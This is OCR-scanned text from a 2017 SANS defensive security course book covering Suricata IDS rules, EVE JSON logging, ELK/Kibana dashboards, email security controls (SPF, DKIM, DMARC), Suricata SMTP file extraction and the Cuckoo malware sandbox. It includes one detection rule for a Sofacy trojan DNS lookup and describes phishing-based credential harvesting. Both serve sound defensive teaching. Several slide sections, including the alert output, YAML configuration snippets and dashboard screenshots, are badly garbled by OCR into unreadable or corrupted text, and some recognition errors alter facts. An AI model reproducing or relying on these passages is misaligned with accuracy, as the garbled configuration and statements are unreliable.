Suricata IDS ("Alert") Like Snort, Suricata works with rules. These rules are read by the IDS/IPS engine to inspect traffic. Rules are written in text files, using a particular syntax (explained later). The different rule files are referenced in the Suricata config file.
Rules can be obtained from various sources. There are free, open-source rules maintained by communities or commercial organizations. These commercial organizations wi II also often offer another set ofrules; these rules are commercial and have to be paid for via a subscription. Of course, it is possible to develop one's own rules ifthe necessary skills are present in your organization.
A rule can just alert or it can block. Rules are organized in categories and are ranked with a severity level.
Typically, a rule looks at traffic flowing in one direction. For example, incoming traffic or outgoing traffic. Rules will often use variables like HOME_ NET and EXTERNAL_ NET to define the direction ofthe traffic they inspect. For example, a rule that starts with HOME_ NET -> EXTE RNAL_NET will look at outgoing traffic. It is important to understand one's network and to configure the network variables accordingly. Wrongly defining the network variables will make that the rules will not be able to inspect all traffic correctly.
For example, a rule that inspects outgoing HTTP requests will have HOME NET-> EXTERNAL NET in its definition. Jfthe variable EXTERNAL_NET does not properly define the e;ternal network (e.g. c;-ntaining the web servers found on the Internet), then the rule cannot detect traffic, and it will not produce alerts.

26

© 2017 Erik Van Buggenhout & Stephen Sims

Suricata IDS ("Alert")- Emerging Threats Ruleset (I)
· Emerging Threats is an organization focused on threat intelligence

i:I EMERGING TH RE ATS nowpartof prootpomt~

· They distribute a community IDS ruleset (called "Emerging Threats") and a paid IDS ruleset (called "Emerging Threats Pro")

· ET was acquired by Proofpoint in 2015

· ET rulesets are easily deployed in both Snort &Suricata

TaLOS

· An alternative to ET are the Talos / Snort (part of Cisco) rulesets:
=> Both free community and paid professional version.s are available

SANS

Suricata IDS ("Alert")- Emerging Threats Ruleset (1) One source offree and paid-for rules is Emerging T hreats.
Emerging T hreats is an organization that focuses on threat intelligence. They observe threat actors and analyze their methods ofoperation in detail. With this threat intelligence, they are able to create rules that can be used in IDS/ IPS devices to detect attacks and other actions by threat actors.
Emerging threats distributes a free set ofrules (the community IDS ruleset called "Emerging Threats") and a paid ruleset (called "Emerging Threats Pro"). These rulesets are updated daily: existing rules are modified or retired, and new rules are added. This is why the commercial offering by Emerging Threats works with a subscription model : paying for a subscription gives the right to the subscriber to download new rules (Emerging Threat Pro) daily.
These rulesets are available for Snort and Suricata (the syntax of these rules can vary slightly), and also for different versions of Snort and Suricata, as more recent versions of these engines contain features that rules cannot use in o lder versions.
Emerging Threats was acquin::d by Proofpoint in 20 IS.
Another source of rules are the Snort rulesets. Snort was acquired by Cisco and is not part ofTalos. Talos both offers free community and paid professional rulesets.
Professional rulesets are often based on threat intelligence that is not public knowledge.

© 2017 Erik Van Buggenhout & Stephen Sims

27

Suricata IDS ("Alert") - Emerging Threats Ruleset (2)
· Full overview on the free ET ruleset can be found on http://doc.emergingthreats.net/
· Typical categories include: Trojan, DoS, SCADA, Worm, Exploit, SMTP ...
· Example rule:
alert udp $HOME_NET any-> any 53 (msg:"ET TROJAN Sofacy DNS Lookup hotfixupdate . com"; content:"101 00 00 01 00 00 00 00 00 001"; depth:10; offset:2; content:"l0dlhotfix-updatel03jcoml00I"; fast_pattern; nocase; distance:0; reference:url,fireeye.com/resources/pdfs/apt28.pdf; classtype:trojan-activity; sid:2019570; rev:2;)
SAN.~
S uricata IDS {"Alert") - Emerging Threats Ruleset (2) For more information on the free Emerging Threats ruleset, consult http://doc.emergingthreats.net. This Wiki gives an overview of all rules in the free ruleset.
The above example is a rule that inspects DNS queries. This can be deduced from the type of traffic it analyses (UDP) and the direction the traffic takes (from the internal network, on any port, to any lP address on port 53- that is the DNS port). It will look for byte patterns that indicate a DNS query (0 I 00 00 0 I 00 00 00 00 00 00) and then it will check if the domain is hotfix-update dot com. If this is the case, the rule will produce an alert.
This alert will include the name ofthe rule ("ET TROJAN Sofacy DNS Lookup hotfix-update com") and the ID ofthe rule (2019570), together with infonnation regarding the traffic like source and destination addresses and ports.
The classtype ofthe rule is trojan-activity. Emerging Threats has many categories, like Trojan, DoS, SCADA, Wonn, Exploit, SMTP ...

28

© 2017 Erik Van Buggenhout & Stephen Sims

Suricata Output

-~~-- - . --- ------

·c«-ltl..,lf.tl ·

' .

-- ~~ -------
. ..

· *"'~·\OfJ! ffllblH: yH rt\tt1pe: r~ \fr

f ·i;u:.e:·~ut!P"' : "20l'1-02-l6T11: l!.: 36. $04419+-0lOO· , · t:1ow 1.d.. -: 156430!607707941, "'pcap en "" ;.· : 6!, "ett-nt_cype· : "'alere· , ..~rc_1p·: ·96. l26.103 .196· -:·a-z:c_port":80, " desi:._1p"': ·10.1

EVEJSON

f l\Ntflel f Yll-.j
· oretb:: -,c..: · I tM to\.\ow\119 · l\.dt'flt \.t)I: ·.s.ur\c

0.10 . 16· , ·e1e, e_po~· :63923, "proco· :"006" , · ele:-c · : ( · accion": "allowed·, · 01d": 1, ·sion
a-cure: 1d": 2!03027, ·rev·: 1., ·siqnawtt" :·£TPRO W£8 Cl.tENI Kia(td;Oft. Ex cel &a.lton:.ed Seltc:c.1on (type OxlO) BIF?' record" . ·ca'ce:qory· : "At:t:.e::tl!Pt.·d Qaer

Example of

1f'KtUty: \oo\S t\evt\: Into H
HE ,r..,ts:
· :JC"''l'ef : 117.D, · pc>f"t: .,,.

P1:iv1le9~ Ga i.n", ·~eve:r.it;y":1), '"ht~·: t "ho!t-.--ie:i:.e·: "e xaimple.coa.", ·i:.:.rl": " \/t11e s\/'t-aq,\/~roed .
x.15·~·ht.~p_u!ler_ao~n.'C· : · Hozilla\/$.O (W1nd.c.w5 NT 6.3: WOW6<'l) :.PPleKebKic\/S~'1.36
(a<l!'IML, bite Geel<o) Chr01114!\/56,0 , 2924.87

eve.json with an alert

I Mdit: \\U H

Sa fari.\/53?. 36", " ht~p concent. type" : ··ppl.1cac1on\/vnd.iu-exeel·, "'beep a:e:th.od·: "'GE.T

t'Vo;...----------...---....------------------~-------- · kit)': s\lr\uU
I Rt4U plpe\tnt.

·. " protoc:ol.·: · MTTP\/1:-l", " .sc.aCu.a·: 200, "lenqtji· : 54918))

-

· 'httch·slu'

· cOMect\on · t t h· c.on of I.OM ~ r y. ltM:n \t. no t\uSMtWI \~\tflt:nted

· to th\t se-tU.n9 n to k r· sef'\litd to M.9h tr·ff\c surk·t·.

I plpt-Uf'lo\A9: · tnffhd: yo ·· set t:nt,ble to yes to tn.tb\t query p\pe\\ntft9

· b.atcl\·st.H: 11 H MH"Jbfr of 4ntry to 1tttp \n b1.1tter types:

Suricata output types

· ·le-rt: fl. ~y\O,ed: YH

1 .-Atb\t dU"'Plnt P4y\o.ad ln hH64

1 p..ylOld·burte-r- s\n: 4kb · NX sh~ of ~y\o.d blilf'fer to output \n ~··log I ~ .,\o,td,pr\nt,1b\1: Ye"C · t'f\ftllt dWIPl.nf p11\wd \ft prlnt.b\· (lossy ) (or,wt

Suricata supports a variety of output types & logs.

· PK. ct: YU
M tp: y.-1 t\t.: ye,.
ssh: yu

· ~ b\e d~\ng or J>Kkll (11\t"'"t ltfHl'I S.-gMAt.l) I itnebte ·wc,,tt19 or http t\ehb I H o11ble dUftP\fto$1 of t h fle \d· · t ftMlt d~\ng ot uh n·lds

One of the most useful ones is the EVE JSON log format, which provides a logging format for all of

uu:p: yes

· eNb\e chUo1ptng of 1r1tp thr\.tlS

its different event types (alert. http, tis. smtp....)

Suricata Output When analyzing traffic, Suricata can be configured to produce different types ofoutput. This is done through the configuration file suricata.yaml. A very useful output log is the EVE JSON log fonnat (file eve.json). This will contain alerts and other infonnation in JSON, and can then be integrated into other applications.
In the example above, the eve-log is configured to produce an eve.json file with alerts.
One alert is displayed in the eve.json file. We know it is an alert because of key/value entry "event_ type":"alert".

© 2017 Erik Van Buggenhout & Stephen Sims

29

Suricata Output - Dashboarding with ELK

· Suricata has no built-in visualization/ dashboard engine

· We can however easily feed the EVE JSON format to a solution such as

ELK (ElasticSearch - Logstash - Kibana) · The ELK stack is free and allows for customized log
parsing & visualizations development, commercial

it· elastic

support is offered by Elastic · SANS Instructor &Author Phil Hagen maintains

~i=-icLK

SOF-ELK®, a free ELK virtual appliance that replicates

SIEM-like functionality

· Stamus Networks has developed the open-source SELKS (Suricata -

ELK- Scirius), which includes Scirius for easy rule management

SANS

S uricata Output - Dashboarding with ELK Suricata (like Snort) is a bare-bone IDS/ JPS: it will produce output files with alerts and other events, but it does not have a graphical user interface or a simple text interface to visualize and analyze alerts.
This can be done with ELK: ElasticSearch - Logstash - Kibana. These are free, open-source products that can read, store, index and visualize information like Suricata events.
The ELK stack is a free product that can be customized to parse logs like eve.json, and display information. Elastic, the company behind ElasticSearch, offers commercial support.
ELK has been used in many products, like SOF-ELK. SOF-ELK is a free ELK virtual appliance created and maintained by SANS Instructor and Author Phil Hagen. It replicates SIEM-like functionality.
Another application of the ELK stack is SELKS: Suricata - ElasticSearch - Logstash - Kibana - Scirius. This open-source stack is developed by Stamus Networks. It integrates Suricata and ELK and provides Scirius for rule management. Suricata has no rule management in itself. Rule management is essential for updating rules automatically and maintaining local modifications to rules.

30

© 2017 Erik Van Buggenhout & Stephen Sims

Suricata Output - Example Kibana Dashboards

._ .. , oa.,.,.... >
a

.·-
2,077

.,...__

---~ - - _ 38 o...

........,_.....
~ ~ ........__.

l ... ~ -

.,,,,~l ffNO"'°"-l "-...,.,,...........
""°1101111 \AM.7>&tlf .................~ ,

-.....,

.. ., ,,.·_......,.....,,..,_..,.._...n....a. .v...,.,..1..1..,,.f..o..O...,l

?t'ttM
~

-

~

·

-

~ .

.

.

.

.

.

r t J O U O ~ . . . . .t . . . . .....-111111,

,.,
,.

...,.._,,..ltlilll._~...,.m ~t0tc....··.....,_,....flllQ.._..............
n.,.,._ .. rlNO................ ~.................c.-: .....
t,.._lillOllr,.l ~~,._..w....,..~t

"",.

r"IIIIIIO.....,IMI...,.......,,._,....,~_.<_,'-"'

,.,.,,woa., .......,,.....,.......,,.....,,.......~

. , . , . ~..................,-c,.._.............4 1

ITO.... M~._....,.... . . . . . .
1t·..,... no 0 .-1-c.t..... ,t,o. ,...,..,..._.,.._._,.,..,,....,..-c.,......
l1'K"' ·._...,.,....,_,,.....,...,.......,··_..,,
C,JQ.rt....JIOSl·---------

Kibana eye-candy
Although the design skills of the course author arc limitet.l, Kil,,rna µrovidcs a n excellent means of visualizing data to facilitate further analysis.
The screcnshot on the left illustrates a simple. casy-touse dashboard interlace for Suricata IDS alerts.

SANS

Suricata Output- Example Kibana Dashboards Visualization of information in ELK is done via Kibana. Kibana provides a web interface to search and display the infonnation stored in ElasticSearch. Kibana supports dashboards: these are panels of infonnation that be configured by the user without programming.
In the example above, we see a dashboard in Kibana for Suricata alerts produced by Emerging Threats Pro rules. At the left ofthe dashboard, we see the number of IDS events (2077) and the number ofdifferent types of rules that triggered (38). At the right ofthe dashboard, we have an overview of the rules that generated alerts.
The rules are sorted by decreasing number ofalerts: the rule that generated the most alerts is at the top with 857 alerts.
This dashboard is interactive: ifwe click on this rule with 857 alerts, the dashboard will be filtered to display more infonnation for the alerts generated by that rule only. This is done via the Lucene query language, although this is transparent to the user. For nonnal use, the user does not need to know the Lucene query language, everything can be done via the GUI.

© 2017 Erik Van Buggenhout & Stephen Sims

31

Suricata 10S/IPS-Additional Resources
Some additional resources that can prove to be useful for Suricata IDS / IPS include:
· https://suricata-ids.org/ Suricata IDS / IPS project official page
· https: //rules.emergingthreats.net/ Official Emerging Threats Open ruleset
· https: //launchpad.net/~oisf/+archive/ubuntu /suricata-stable Suricata PPA packages by Peter Manev
· ht:nr //forsn.com/sof-elk-readme
SOF-ELK virtual machine by Phil Hagen
Suricata IDS/IPS- Additional Resources Some additional resources that can prove to be useful for Suricata IOS / IPS include: https://suricata-ids.org/ Suricata IOS / IPS project official page https://rules.emergingthreats.net/ Official Emerging Threats Open ruleset https://launchpad.net/~oisf/+arch ive/ ubuntu/suricata-stable Suricata PPA packages by Peter Manev http://for572.com/sof-e1k-readme SOF-ELK virtual machine by Phil Hagen

32

~ 2017 Erik Van Buggenhout & Stephen Sims

Course Roadmap
· Day 1: Knowing the Adversary, Knowing Yourself
· Day 2: Avertine Payload Delivery
· Day 3: Preventing Exploitation · Day 4: Avoiding Installation, Foiling
Command & Control & Thwarting Lateral Movement
· Day 5: Exfiltration, Cyber Deception & Incident Response
· Day 6: APT Defender Capstone

SEC599.2
Strategies for Preventing / Detecting Payload Delivery
· End-User Security Awareness Leveraging Suricata IDS / IPS E-mail Security Controls Exercise: Building a Sandbox Using Suricata & Cuckoo Zooming in on YARA Rules Exercise: Finding the Needle in the Haystack Using YARA Web Security Controls Exercise: Deploying pfSense Firewall with Squid & ClamAV Stopping Delivery Using Removable Media Visualizing the Results of Our Solutions Exercise: Developing Eye-Candy Using Kibana Controlling Script in the Enterprise Exercise: Controlling Script Using GPO's

This page intentionally left blank.

© 2017 Erik Van Buggenhout & Stephen Sims

33

I
Overview - Primacy of E-mail in the Enterprise
IE-mail is the main means of communication in all enterprises, everyone has an e-mail address from receptionists to CEO's.
IE-mail is accessible on a variety of devices, including mobile phones, tablets, workstations ...
ISending e-mails is rela~iv~ly low effort, while addresses are e~sy to obtain: The vast ma1onty of payloads are currently delivered through e-mail.
SANS
Overview - Primacy of E-mail in the Enterprise There is not a single organization that does not make use of e-mail. Every employee has an e-mail address, ranging from receptionists and IT personnel to C-level executives. It is the main means ofcommunication. This is not very surprising, as it is a communication means that is accessible on a variety of devices and a llows everyone to be permanently reachable. You can view your e-mails on your workstation, on your smartphone when walking away from your workstation or from any other device through a web client.
Sending an e-mail is low effort. All it takes it is typing up a message and inputting the receiver and potentially a subject. Ins ide the organization, all addresses are usually reachable through the address book. Even outside the organization, addresses are generally easy to obtain. Often an organization's website will contain addres.ses ofa number of people, or they can be found through social media. In most organizations, one specific structure is used, such as firstname.lastname@company.org or f.lastname@company.org. Once you have obtained one user's e-mail address, it's possible to derive addresses for other users based on their name only. Combine all these facts and it's obvious why the vast majority of payloads are delivered through e-mail. It' s a medium that allows attackers to quickly reach a large number of users from different target groups.

34

© 2017 Erik Van Buggenhout & Stephen Sims

E-mail Attacks Against the Enterprise
Common APT attack strategies abusing e-mail against organizations currently include:

Phishing used for credential harvesting (fake login pages sent via e-mail)

Phishing used to deliver malicious payloads (e.g. malicious attachments or malicious URLs)

E-mail Attacks Against the Enterprise E-mail attacks can use different attack vectors to target your users and organization. The first method is credential phishing, during which an attacker sends a URL to an organization's users. After clicking the URL, the user will be taken to a website containing a login portal, resembling the login portal for a legitimate service. An example is a website that is crafted to look like Google Drive, claiming users have a document waiting for them that can only be viewed after providing credentials. Once the user enters their credentials and click the login button, the credentials are sent to an attacker-controlled server and the user is redirected to another page, often claiming the login did not work.
Another, potentially more dangerous, but also more visible attack vector, is a malicious attachment. These emails often contain office documents that have malicious macros waiting to be executed by an unsuspecting user. The impact of a successful attack is higher since a malicious program might be executed on the user's workstation (ransomware, anyone?). The visibility ofa malicious attachment is, of course, higher as well since these often pass anti-virus scanners or raise suspicion with users.

© 2017 Erik Van Buggenhout & Stephen Sims

35

I
E-mail Security Controls
In order to increase the security of e-mail in the enterprise, several techniques can be implemented:
l!II SPAM, phishing, and malicious e-mails are often sent with spoofed e-mail addresses. There are several protocols to authenticate e-mails.
I l l Malicious URLs and attachments included in e-mails can be extracted and analyzed (e.g. checked against blacklists or executed inside a sandbox for dynamic analysis}.
SAN~
E-mail Security Controls A significant amount of unwanted e-mails is delivered with a spoofed e-mail address. A spoofed e-mail address is a forged e-mail address: it is not the e-mail address of the real sender. Sending e-mail addresses can be forged at two levels in an e-mail: "MAIL FROM:" in the start ofthe SMTP connection (RFC532 I), and "From:" in the data part of the SMTP traffic (headers, RFC5322).
Several protocols exist to prevent spoofed e-mails:
· Sender Policy Framework (RFC7208): this allows the mail server to check that e-mail claiming to come from a particular domain (present in the e-mail address of the sender) is coming from a host under the control of that domain owner. This check is implemented with TXT records served by the DNS server of the domain, with the IP addresses of the authorized hosts. S PF checks the MAIL FROM: domain
· Sender 1D (RFC4406) improves upon S PF by checking the header address (From:) · Domain Keys Identified Mail (RFC6367): while SPF tries to validate sender's domains by checking IP
addresses of the hosts, DKIM tries to validate sender's domains by using public key cryptography. DKIM digitally signs the From: address (RFC5322). The public key used for signing the address can be retrieved via a DNS TXT record. · Domain-based Message Authentication, Reporting, and Confonnance (RFC7489): DMARC prevents spoofing ofthe From: address and is based on SPF and DKIM.
These protocols can help with alleviating unwanted e-mail but are only effective if the (spoofed) domain implements at least one of these protocols. Ifa sending domain does not provide any method to validate senders, it is up to the business to decide if they want to accept or drop these messages. Most businesses will accept these messages, in fear ofmissing potential customers.
In addition to the e-mail source, the contents of the e-mail can be used in security verification as well. URLs and attachments can be extracted and analyzed using blacklists or sandboxes to determine malicious behavior.

36

© 2017 Erik Van Buggenhout & Stephen Sims

E-mail Security Best Practices
Below are some best practices to improve the security posture of your e-mail infrastructure:
· Strongly limit e-mail relay settings to prevent open relaying · Implement Sender Policy Framework (SPF) to prevent source e-mail
address spoofing · Ensure POP3 & IMAP authentication & encryption are enforced · Ensure all incoming (& outgoing) e-mails are analyzed by an AV engine
or sandbox · Do not accept executable objects as attachments (scripts, binaries...)
SANS
E-mail Security Best Practices Below are some best practices to improve the security posture ofyour e-mail infrastructure:
Limit e-mail relay settings to prevent open relaying. An open e-mail relay is an SMTP server that allows anyone on the Internet to send e-mail through it and not just e-mail destined to or originating from k.nown users. Implement Sender Policy Framework (SPF) to prevent source e-mail address spoofing. Ensure POP3 & IMAP authentication and encryption are enforced to avoid unauthorized access or interception ofe-mails. · Make sure incoming (and to a lesser extent outgoing) e-mails are analyzed by an AV engine or sandbox to avoid malicious attachments reaching your users. Do not accept executable objects as attachment (such as script or binaries). Usually, these file types are not required for business operations.

© 2017 Erik Van Buggenhout & Stephen Sims

37

I
E-mail Security Solutions
In order to implement security controls, several solutions are available:
· Cloud-based e-mail solutions that include security controls; · Dedicated appliances (e.g. FireEye MX); · Open-source solutions (e.g. combining Suricata & Cuckoo);

~
~~FireEye·

CUC~

SANS

E-mail Security Solutions Several solutions exist that can help organizations in implementing e-mail security controls. Using a cloudbased e-mail solution can help in offloading the security controls to a vendor that is specialized in providing secure e-mail. Many of these solutions will provide anti-spam measures and scan e-mail traffic for malicious content, or even provide encryption and signing of messages.
Another option is to install dedicated appliances in your environment to implement e-mail security, such as FireEye MX for example. All e-mail traffic passing through this device will have its URLs and attachments checked. Files are run in different sandboxes to determine malicious behavior. In case something suspicious is detected, the e-mail will be blocked from reaching the targeted user.
Making use ofopen-source solutions allows you to improve your e-mail security as well, for example through an open-source IDS and anti-virus, such as Suricata and Cuckoo.

38

© 2017 Erik Van Buggenhout & Stephen Sims

E-mail Security Architecture
Suricata can be used to extract both links and attachments in e-mail messages, using its powerful SMTP URL & file extraction module.

IDS / IPS
*

Mail Server

End-use r w o rk.slatiuus

We can leverage Suricata to extract URL's & attachments from raw SMTP traffic, which can then be fed for analysis to a sandbox such as Cuckoo

SANS

E-mail Security Architecture Putting an Intrusion Detection System/Intrusion Prevention System in front of an mai I server or web server is a popular detection and prevention method.
An Intrusion Detection System is only capable of detecting intrusions, it cannot prevent them, while an Lntrusion Prevention System can prevent intrusions.
An IDS just needs a copy of the network traffic to be able to do its job. So, it does not have to be put inline (although it can) like shown in the diagram above: the IOS receives the traffic destined for the server and passes it on. While an IPS has to be able to block traffic, it is best placed in line. By being inline, an IPS can prevent intrusion by dropping network packets that try to exploit a vulnerability. The risk of inline operation is that with general failure of the IDS/IPS, network connectivity to the protected server is interrupted.
In the example above, we see an IDS/ IPS protecting a mail server, but it can protect other servers too, like web servers, proxies, database servers...
There arc 2 major open-source IDS/IPS applications: Snort and Suricata (which we already discussed briefly). Hoth systems decode and normalizt: 111::twork traffic before it is inspected. Network traffic can be used to transfer content in many forms. Just as a simple example, IITML transferred via HTTP can be transferred in network packets as text, or gzip compressed. To inspect the traffic efficiently, the traffic is first decoded and normalized. In our example, this means that gzip compressed content is decompressed before it is inspected. Inspection of traffic can be done via rules or via protocol parsers.

© 2017 Erik Van Buggenhout & Stephen Sims

39

Enabling Suricat a SMTP Logging

- eve-log:

Enabling SMTP logging in

enabled: 8e_enable_evelog9
file~ype: regular tregular syalog unix_egraml unix_stre.m redis filename: e~a.j$on

Suricata is simple. Adding an entry for SMTP in the EVE-log should do the trick.
SMTP configuration
An entry for SMTP is added to the EVE. log. If desired, additional configuration can be set. such as extended or custom field logging and MDS calculation of the body or subject.

typos:

- alert:

f payload: yes

f ecable dWDping payload in B

f payload-buffer-size: 4kb t :aax si~e of ~yload buffer

f payload-printable: yes I enable dumping payload in p

f packet: yos

I enable dumping of packet (w

ht.t;.p ; ye..s

f enable d~'llp1ng of http fields

tl:.; yes

t ·n·ble dumping of tls fields

ssh: Y·· smtp: yes dnp3: yes vars: yes

t anab2e dumping of ssh fields
tenable dumping of r.atp fields tenable dumping of ONP3 fields tenable dwoping of flowbits an

- htt.p:

extended: yes - dns

enable this tor extended logging inf

- tls:

ext.ended: yes - tiles :

·nable this for extended logging int

foree--gie: no f force :egging =gic on al! logged fi -----. f per flo-.. direction . All logs each dropped pke.

Enabling Suricata S MTP Logging Enabling SMTP logging is as simple as adding an SMTP entry to the EYE-log in the Suricata.yaml configuration file. Ifdesired, additional configuration can be set to determine the exact fields that should be logged. Below is a sample configuration containing more information about the "extended", "custom", and "md5" settings. These settings allow extended logging of additional fields or custom logging for specifically required fields. The md5 settings allow the calculation ofan MOS sum of the body or subject.
#extended: yes # enable this/or extended logging information # this includes: bee, message-id, subject, x_mailer, user-agent # custom fields loggingfrom the list: # reply-to, bee, message-id. subject, x-mailer, user-agent, received. # x-originating-ip, in-reply-to, references, importance, priority. # sensitivity, organization, content-md5, date #custom: [received, x-mailer, x-originating-ip, relays, reply-to, bee] # output md5 offields: body. subject #for the body you need to set app-layer.pro10cols.smtp.mime.body-md5 # to yes #md5: [body, subject}

40

© 2017 Erik Van Buggenhout & Stephen Sims

Enabling Suricata SMTP Attachment & URL Extraction

To enable file extraction, the MIME decoder should be enabled.
Adding an entry to enable the MIME decoder

app- ayer: protocols: smtp: enabled: yea I configure SMTP-MIME Decoder mi.m.e:
f Decode MIME mes1a.ges fro::'Q SMTP t.ra.nsaction1 t (may be resource intensive)
t IJ'hiQ: fiold s.u~rcadaa all others because it turna t.he entire
t process on or off decode4:llim.·: Y··
t Decode MIME entity bodies (i&. bue64, quoted-printable, etc.)
decode-base61: yes decode -quoted-pr intable: yes

t Maxi.mum bytes per hoader daca value stored in ~h· dat· structure f (default is 2000)
header-value-depth : 2000

Additionally. the MIME decoder can also extract URLs from the SMTP message body

t 2 x~ract URts and s·v· in staee d.ta structure
e x erAct -urls : yea

Enabling Suricata SMTP Attachment & URL Extraction SMTP attachment/file extraction can be enabled through the SMTP app-layer settings. The MIME decoder has to be enabled to take care of the file extraction. Additional configuration allows specifying which entity bodies to decode, such as base64 or Quoted-Printable (QP) encoding. Additionally, the MIME decoder can also extract UR.Ls from the SMTP message body and log them in the SMTP log, which makes it easy to post-
process them (e.g. run them through blacklist or even analyze them in a sandbox).

© 2017 Erik Van Buggenhout & Stephen Sims

41

Introducing Cuckoo
Cuckoo Sandbox is a malware analysis system
· Maintained by volunteers
(Claudio Guarnieri, Alessandro Tanasi, Jurriaan Bremer, Mark Schloesser)
· Supports Windows, OS X, Linux & Android malware · "Infinite application support" (additional client software can be
installed in the Virtual Machines used for analysis) · Trace API calls, analyze network traffic, monitor files touched,
executables launched, memory analysis (Volatility plugin) · Cuckoo-modified provides additional options (e.g. additional
signatures)
SAN~
Introducing Cuckoo Analyzing malware is a complex Lask, that requires highly skilled and experienced staff. Malware analysis is often classified in static analysis and dynamic analysis. With dynamic analysis, the sample is executed in a controlled environment and its behavior is observed. Static analysis does not execute the sample but uses techniques like disassembling and decompiling to look at the code of the malware.
To facilitate the automatic analysis ofmalware without experienced staff, the Cuckoo Sandbox was created. Cuckoo's focus is dynamic analysis: the malware sample is executed in a virtual machine; its behavior is observed and a report is produced with a score indicating how confident the Cuckoo Sandbox is about the maliciousness ofa sample.
It is a free, open-source solution developed and maintained by volunteers.
Cuckoo Sandbox can analyze malware for different operating systems: Windows, Linux, OS X and even Android.
The sandbox is not only able to analyze malicious executables, but also other types ofmalware like malicious documents. For this, Cuckoo Sandhox provides "Infinite application support": for example, to analyze a malicious Word document, MS Office can be installed inside the virtual machine (the sandbox).
The operating system inside the sandbox is instrumented to increase the capacity of Cuckoo to observe the behavior of a malicious sample. This is done by tracing operating system APl calls, capturing and analyzing network traffic, monitoring fi les, registry, process, and even perform memory d ump analysis via Volati lity.
Cuckoo-modified is a fork of Cuckoo Sandbox that provides additional analysis and detection options.

42

© 2017 Erik Van Buggenhout & Stephen Sims

Cuckoo Architecture

Cuclcoohost ~-~ for 1 - 1 and
,.,.1ys,s ffWllcement
,.,port,. St.attanaty,,s, dumps tr1fflc
and ··n·tal<M

AN!ysls-u Adun envlronme,nt when ,un 1
~mpl· The s.}mple bet,,,lor IS ltpo,ted blclt 10 I~ Cuckoo host.
Analvv· VM n I

Analys,. VM n.2

Virtual ne1wo,k An isolated nttwork w~re run ana,Y,,·s \'U'tuiJ
IN(h,-

AnllysnVM n.

http://docs.cuckoosandbox.o,·g/en//atest/_images/architcct11re-mai11.png

SAN.,

Cuckoo host & guest architecture
Cuckoo uses a number of analysis guests co perform its analysis:
· A clean snapshot is used as a guest. in which che sample is executed and analyzed; The guests include a Python-based agent to report on activities (e.g.API calls. network traffic, screenshots...) By installing new software in the guests. additional sample types can be analyzed; Upon finishing the analysis, a report is generated by Cuckoo: Supported visualization software includes VirtualBox. XenServer. KVM .. .

Cuckoo Architecture The architecture of the Cuckoo Sandbox environment is composed ofa host and virtual guests, connected via a virtual network. The Cuckoo host manages the guests: starting of an analysis, analyzing traffic and generating reports. It can connect guests to the Internet, or sinkhole network traffic.
Cuckoo guests are virtual machines that are instantiated from a clean template for each analysis. The Cuckoo hosts instantiate a new Cuckoo guests with the right template for the sample to analyze, submits the sample to the guest for analysis and creates the analysis report.
Cuckoo supports VirtualBox, XenServer, KYM ... for virtualization of the guests. The guest is instrumented with an agent (written in Python) to observe and report back the behavior of the sample inside the sandbox. It is important to look inside the guest for the behavior of the sample, looking from the outside of the guest will miss many significant activities. These activities include API calls, process created, fi !es written, network traffic, ...
To analyze samples that require applications, like PDF files, guests can have new software installed, like Adobe Reader. It is important to select the right version of the supporting application: a very recent version will have known vulnerabilities patd11::<l, and a version that is too old might not be "supported" anymore by the malware. For example, when the malware exploits a feature that was only introduced in recent versions. In order to have an effective & realistic sandbox, it's a good idea to tailor the virtual machine used for analysis to your environment: deploy similar software as the ones you have running in your corporate environment.
After execution (or when a time limit is reached), the analysis is terminated, the guest is recycled and the report is produced.

© 2017 Erik Van Buggenhout & Stephen Sims

43

Cuckoo Output
Upon completing the analysis, Cuckoo generates a report including the following information:
· Overview of matching "signatures"
(signatures are often community-created and attempt to detect typical malicious behavior, e.g. "creation of a service", "dropping offiles", "extensive crypto operations"...
· Network traffic (can integrate with Suricata for IDS alerting) · Dropped files · Memory dump ·
SANS
Cuckoo Output The Cuckoo analysis report is generated upon completion of the analysis and contains the fol lowing information (this is a non-exhaustive list).
· An overview ofmatched signatures · An overview of network traffic (this includes a PCAP file, and can be integrated with Suricata) · Files that were created and modified on the guest file system · Process that were created and tem1inated · A memory dump · Registry entries created and modified
Signature is "rules" that are often created by the community. These rules will detect typical malicious behavior: installation ofa Windows service, dropping files and executing them, Internet activity ...
It' s poss.ible to create custom signatures to detect malicious behavior that is pertinent to your corporate environment.

44

© 2017 Erik Van Buggenhout & Stephen Sims

Cuckoo Reporting

,,-.
,....
,,-.

··----
·-- ··---- 9 ,....,.,.....,.,... ··--- o -

® 8 P·J

o--

Cuckoo Reporting A report is presented in the Cuckoo web-based GUI in the slide above.
We submitted a WannaCry sample to the Cuckoo sandbox for analysis. Remark that the report mentions an "error" : the analysis timeout threshold was triggered. This is normal for ransomware like WannaCry, as it will take quite some time to encrypt all the files in the guest. At the left ofthe report is an overview ofthe different sections.
The summary section provides the hashes of the submitted sample and a score. Remark that at the time of writing, the scoring system was stiII an alpha feature (the score is I 1.2/ I0).
Other interesting sections are Behavioral Analysis, Network Analysis, Dropped Files ...
Some sections will have a number next to them. This indicates the number of so-called "events" in the section. For example, for Process Memory, we have 23 process memory dumps.

© 2017 Erik Van Buggenhout & Stephen Sims

45

Cuckoo Reporting - Signatures
0 Poi""',ol!l'-Ultt.,-.f......iolho _ _ .....,,,(50ootofl32_,,)
<>-·-----.. __. ...~,,,_) _,_(I~ 0 ,_,_,.,.,,_..
0
o _,,,._,,c..,,..-,.._.,..,.,....,._(2_..)

Cucko o signat ures
Next co its manual analysis results, Cuckoo reports on a number of"signatures" for

SAN.~
Cuckoo Reporting- Signatures A remarkable feature ofCuckoo Sandbox is its signatures.
Events, like we saw in the report of the previous slides, are analyzed and grouped to draw conclusions from the behavior of the sample. This provides a high-level view ofthe behavior.
In the report above, we can see several interesting signatures that triggered.
Installs itselffor autorun at Windows startup: this is often done by malware to achieve persistence on the infected machine · Runs bcdedit commands specific to ransomware: ransomware will often change the boot configuration data to hinder recovery · Installs Tor on the infected machine: Tor is an anonymization network, and its use inside an enterprise is highly suspicious and often against policy
Notice that these triggered signatures are color-coded (yellow and red). This corresponds to a severity level.

46

© 2017 Erik Van Buggenhout & Stephen Sims

'
Cucl<oo Installation
Although well-documented, installing Cuckoo can be a bit daunting:
· Many prerequisites are to be correctly installed · Refer to http:// docs.cuckoosandbox.org/en/latest/ for full manual and
support documentation · An online instance of Cuckoo Sandbox can be found at
https: //malwr.com/ · Buguroo Offensive Security developed an "auto install script" for
Cuckoo: https:/ /github.com/buguroo/ cuckooautoinstall
